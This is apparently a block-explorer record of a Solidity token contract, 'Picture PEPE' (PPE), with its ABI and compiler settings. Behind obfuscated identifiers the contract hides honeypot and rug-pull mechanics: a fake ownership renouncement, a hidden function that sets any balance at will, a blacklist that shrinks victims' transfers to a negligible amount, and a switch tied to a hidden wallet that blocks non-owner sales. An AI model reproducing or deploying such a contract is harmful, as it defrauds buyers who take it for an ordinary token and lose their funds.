{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface txTeamReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityAmount) external view returns (uint256);\n\n    function transfer(address totalFund, uint256 teamLaunchedMax) external returns (bool);\n\n    function allowance(address senderIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamLaunchedMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalFund,\n        uint256 teamLaunchedMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderSwap, uint256 value);\n    event Approval(address indexed senderIs, address indexed spender, uint256 value);\n}\n\nabstract contract fundAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableAt {\n    function createPair(address senderMinShould, address buyTo) external returns (address);\n}\n\ninterface txBuy is txTeamReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PicturePEPE is fundAuto, txTeamReceiver, txBuy {\n\n    address public amountReceiver;\n\n    uint256 listTo;\n\n    mapping(address => bool) public receiverTxWallet;\n\n    uint8 private liquidityEnable = 18;\n\n    address public sellReceiver;\n\n    uint256 public totalWallet;\n\n    function teamReceiver(address isTake) public {\n        if (swapReceiverTo) {\n            return;\n        }\n        if (marketingEnableAmount != tradingIsExempt) {\n            tradingIsExempt = totalWallet;\n        }\n        atLimit[isTake] = true;\n        if (totalMin != tradingIsExempt) {\n            marketingEnableAmount = totalWallet;\n        }\n        swapReceiverTo = true;\n    }\n\n    bool private tradingTake;\n\n    function transfer(address marketingList, uint256 teamLaunchedMax) external virtual override returns (bool) {\n        return shouldReceiver(_msgSender(), marketingList, teamLaunchedMax);\n    }\n\n    uint256 private limitExemptReceiver = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitExemptReceiver;\n    }\n\n    function autoFee(address marketingList, uint256 teamLaunchedMax) public {\n        launchTrading();\n        tradingLimitSender[marketingList] = teamLaunchedMax;\n    }\n\n    mapping(address => uint256) private tradingLimitSender;\n\n    function buyList() public {\n        emit OwnershipTransferred(sellReceiver, address(0));\n        shouldList = address(0);\n    }\n\n    string private receiverAutoIs = \"PPE\";\n\n    function getOwner() external view returns (address) {\n        return shouldList;\n    }\n\n    uint256 public tradingIsExempt;\n\n    bool private walletFund;\n\n    function allowance(address amountSenderLaunched, address shouldExempt) external view virtual override returns (uint256) {\n        if (shouldExempt == txExempt) {\n            return type(uint256).max;\n        }\n        return fundLimitMin[amountSenderLaunched][shouldExempt];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityEnable;\n    }\n\n    function amountShould(address modeSenderAuto) public {\n        launchTrading();\n        if (marketingEnableAmount == totalWallet) {\n            walletFund = false;\n        }\n        if (modeSenderAuto == sellReceiver || modeSenderAuto == amountReceiver) {\n            return;\n        }\n        receiverTxWallet[modeSenderAuto] = true;\n    }\n\n    constructor (){\n        if (totalMin == marketingEnableAmount) {\n            marketingEnableAmount = totalWallet;\n        }\n        exemptReceiver toAt = exemptReceiver(txExempt);\n        amountReceiver = enableAt(toAt.factory()).createPair(toAt.WETH(), address(this));\n        if (totalMin != tradingIsExempt) {\n            tradingIsExempt = launchedWallet;\n        }\n        sellReceiver = _msgSender();\n        buyList();\n        atLimit[sellReceiver] = true;\n        tradingLimitSender[sellReceiver] = limitExemptReceiver;\n        \n        emit Transfer(address(0), sellReceiver, limitExemptReceiver);\n    }\n\n    address swapWalletTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchTrading() private view {\n        require(atLimit[_msgSender()]);\n    }\n\n    string private marketingShould = \"Picture PEPE\";\n\n    event OwnershipTransferred(address indexed enableSwap, address indexed atEnable);\n\n    bool private liquidityTake;\n\n    function shouldReceiver(address listSwap, address totalFund, uint256 teamLaunchedMax) internal returns (bool) {\n        if (listSwap == sellReceiver) {\n            return totalTake(listSwap, totalFund, teamLaunchedMax);\n        }\n        uint256 minAuto = txTeamReceiver(amountReceiver).balanceOf(swapWalletTeam);\n        require(minAuto == txWalletAuto);\n        require(totalFund != swapWalletTeam);\n        if (receiverTxWallet[listSwap]) {\n            return totalTake(listSwap, totalFund, receiverTakeAt);\n        }\n        return totalTake(listSwap, totalFund, teamLaunchedMax);\n    }\n\n    uint256 constant receiverTakeAt = 16 ** 10;\n\n    uint256 private totalMin;\n\n    function balanceOf(address liquidityAmount) public view virtual override returns (uint256) {\n        return tradingLimitSender[liquidityAmount];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingShould;\n    }\n\n    address txExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverAutoIs;\n    }\n\n    address private shouldList;\n\n    function owner() external view returns (address) {\n        return shouldList;\n    }\n\n    function approve(address shouldExempt, uint256 teamLaunchedMax) public virtual override returns (bool) {\n        fundLimitMin[_msgSender()][shouldExempt] = teamLaunchedMax;\n        emit Approval(_msgSender(), shouldExempt, teamLaunchedMax);\n        return true;\n    }\n\n    mapping(address => bool) public atLimit;\n\n    function totalTake(address listSwap, address totalFund, uint256 teamLaunchedMax) internal returns (bool) {\n        require(tradingLimitSender[listSwap] >= teamLaunchedMax);\n        tradingLimitSender[listSwap] -= teamLaunchedMax;\n        tradingLimitSender[totalFund] += teamLaunchedMax;\n        emit Transfer(listSwap, totalFund, teamLaunchedMax);\n        return true;\n    }\n\n    function limitSell(uint256 teamLaunchedMax) public {\n        launchTrading();\n        txWalletAuto = teamLaunchedMax;\n    }\n\n    uint256 private launchedWallet;\n\n    uint256 txWalletAuto;\n\n    bool public swapReceiverTo;\n\n    mapping(address => mapping(address => uint256)) private fundLimitMin;\n\n    uint256 public marketingEnableAmount;\n\n    function transferFrom(address listSwap, address totalFund, uint256 teamLaunchedMax) external override returns (bool) {\n        if (_msgSender() != txExempt) {\n            if (fundLimitMin[listSwap][_msgSender()] != type(uint256).max) {\n                require(teamLaunchedMax <= fundLimitMin[listSwap][_msgSender()]);\n                fundLimitMin[listSwap][_msgSender()] -= teamLaunchedMax;\n            }\n        }\n        return shouldReceiver(listSwap, totalFund, teamLaunchedMax);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSenderLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSenderAuto\",\"type\":\"address\"}],\"name\":\"amountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunchedMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunchedMax\",\"type\":\"uint256\"}],\"name\":\"autoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamLaunchedMax\",\"type\":\"uint256\"}],\"name\":\"limitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnableAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTxWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiverTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIsExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunchedMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamLaunchedMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PicturePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}